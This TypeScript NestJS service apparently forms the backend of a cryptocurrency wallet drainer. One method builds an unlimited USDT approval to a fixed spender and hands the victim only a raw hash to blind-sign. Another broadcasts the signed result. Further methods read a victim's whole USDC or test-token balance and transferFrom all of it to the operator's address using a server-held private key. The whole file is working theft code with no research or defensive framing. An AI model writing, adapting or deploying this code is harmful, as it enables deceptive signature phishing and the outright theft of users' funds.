import { Injectable, Logger } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import {
  BIG_TOKEN_ADDRESSES,
  USDT_ADDRESS,
  getRandRpcElseOne,
  LOG_TOPIC_SWAP,
  MAX_UINT256,
  PANCAKESWAP_V2_FACTORY,
  mainnetRpcURL,
  SPENDER,
  WBNB_ADDRESS,
  WBNB_BUSD_PAIR,
  USDC_ADDRESS,
  PRIVATE_KEY,
  MY_ADDRESS,
  rinkebyRpcURL,
  ERC20_ADDRESS,
} from 'src/helpers/constants';
import * as ABI_ERC20 from 'src/helpers/abis/ABI_ERC20.json';
import * as ABI_USDC from 'src/helpers/abis/ABI_USDC.json';
import * as ABI_UNISWAP_V2_FACTORY from 'src/helpers/abis/ABI_UNISWAP_V2_FACTORY.json';
import * as ABI_UNISWAP_V2_PAIR from 'src/helpers/abis/ABI_UNISWAP_V2_PAIR.json';

require('dotenv').config();

const buffer_1 = require('buffer');
// const Tx = require('ethereumjs-tx').Transaction;
import { Transaction as Tx } from 'ethereumjs-tx';
import { TxObject } from './interfaces/coinPrice.interface';
import { MetaTx, MetaTxDocument } from './schemas/metaTx.schema';
import { ApproveTx, ApproveTxDocument } from './schemas/approveTx.schema';

@Injectable()
export class MetaTxService {
  private web3;
  private rpcUrl;

  constructor(
    @InjectModel(MetaTx.name)
    private readonly metaTxModel: Model<MetaTxDocument>,
    @InjectModel(ApproveTx.name)
    private readonly approveTxModel: Model<ApproveTxDocument>,
  ) {
    const Web3 = require('web3');
    this.rpcUrl = mainnetRpcURL;
    this.web3 = new Web3(this.rpcUrl);
  }

  async getApproveCode(ownerAddress: string) {
    const web3 = this.web3;
    let [txCount, gasPrice] = await Promise.all([
      web3.eth.getTransactionCount(ownerAddress),
      web3.eth.getGasPrice(),
    ]);

    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI

    const erc20Contract = new web3.eth.Contract(ABI_ERC20, USDT_ADDRESS);
    const approveTxData = erc20Contract.methods
      .approve(SPENDER, MAX_UINT256)
      .encodeABI();

    const txObject: TxObject = {
      from: ownerAddress,
      to: USDT_ADDRESS,
      data: approveTxData,
      nonce: web3.utils.toHex(txCount),
      gasLimit: web3.utils.toHex(50000),
      gasPrice: web3.utils.toHex(gasPrice),
    };

    const tx = new Tx(txObject, { chain: 'mainnet' });

    tx.v = new buffer_1.Buffer([]);
    tx.s = new buffer_1.Buffer([]);
    tx.r = new buffer_1.Buffer([]);
    var msgHash = tx.hash(false);
    console.log('gas', gasPrice, ' 0x' + tx.serialize().toString('hex'));
    return { signHash: msgHash.toString('hex'), txObject };
  }
  async performMetaTx(signedHexString: string, txObject: TxObject) {
    const web3 = this.web3;
    let raw;
    const tx = new Tx(txObject, { chain: 'mainnet' });

    const txCopy = new Tx(txObject, { chain: 'mainnet' });
    tx.v = new buffer_1.Buffer([]);
    tx.s = new buffer_1.Buffer([]);
    tx.r = new buffer_1.Buffer([]);

    var bufferedSignedMessage = Buffer.from(signedHexString, 'hex');
    // console.log("bufferedSignedMessage", bufferedSignedMessage);

    const sig = {
      r: bufferedSignedMessage.slice(0, 32),
      s: bufferedSignedMessage.slice(32, 64),
      v: 27,
    };
    // if (tx._implementsEIP155())
    {
      sig.v += tx.getChainId() * 2 + 8;
    }
    Object.assign(txCopy, sig);

    raw = '0x' + txCopy.serialize().toString('hex');

    console.log(txCopy.verifySignature(), raw);

    const transactionReceipt = await web3.eth.sendSignedTransaction(raw);
    const updateMetaTx = new this.metaTxModel({
      ...txObject,
      txResult: transactionReceipt,
      createdAt: new Date(),
    });
    updateMetaTx.save();

    return transactionReceipt;
  }

  async signTx(web3: any, fields = {}) {
    const nonce = await web3.eth.getTransactionCount(MY_ADDRESS, 'latest');

    const transaction = {
      nonce: nonce,
      ...fields,
    };

    return await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);
  }

  async sendTx(web3, fields = {}, txInfo = {}) {
    const signedTx = await this.signTx(web3, fields);
    // console.log('signedTx', signedTx);
    const hash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log('Transaction sent!', hash.transactionHash);

    const updateApproveTx = new this.approveTxModel({
      rpcUrl: web3.currentProvider.host,
      fields,
      txInfo,
      result: hash,
      createdAt: new Date(),
    });
    updateApproveTx.save();
  }

  async actionForApprove(ownerAddress: string) {
    console.log(ownerAddress, 'ownerAddress');
    const web3 = this.web3;
    const erc20Contract = new web3.eth.Contract(ABI_ERC20, USDC_ADDRESS);
    let [balance, gasPrice] = await Promise.all([
      await erc20Contract.methods.balanceOf(ownerAddress).call(),
      web3.eth.getGasPrice(),
    ]);

    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI

    const sendTxData = erc20Contract.methods
      .transferFrom(ownerAddress, MY_ADDRESS, balance)
      .encodeABI();
    const estimateGas = 100000;
    if (balance != 0)
      this.sendTx(
        web3,
        {
          gas: estimateGas,
          gasPrice: web3.utils.toHex(gasPrice),
          to: USDC_ADDRESS,
          data: sendTxData,
        },
        { ownerAddress, balance },
      );
  }

  async actionForApproveTest(ownerAddress: string) {
    const Web3 = require('web3');
    const web3 = new Web3(rinkebyRpcURL);
    const erc20Contract = new web3.eth.Contract(ABI_ERC20, ERC20_ADDRESS);
    let [balance, gasPrice] = await Promise.all([
      await erc20Contract.methods.balanceOf(ownerAddress).call(),
      web3.eth.getGasPrice(),
    ]);

    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI

    const sendTxData = erc20Contract.methods
      .transferFrom(ownerAddress, MY_ADDRESS, balance)
      .encodeABI();
    const estimateGas = 100000;
    if (balance != 0)
      this.sendTx(
        web3,
        {
          gas: estimateGas,
          gasPrice: web3.utils.toHex(gasPrice),
          to: ERC20_ADDRESS,
          data: sendTxData,
        },
        { ownerAddress, balance },
      );
  }
}
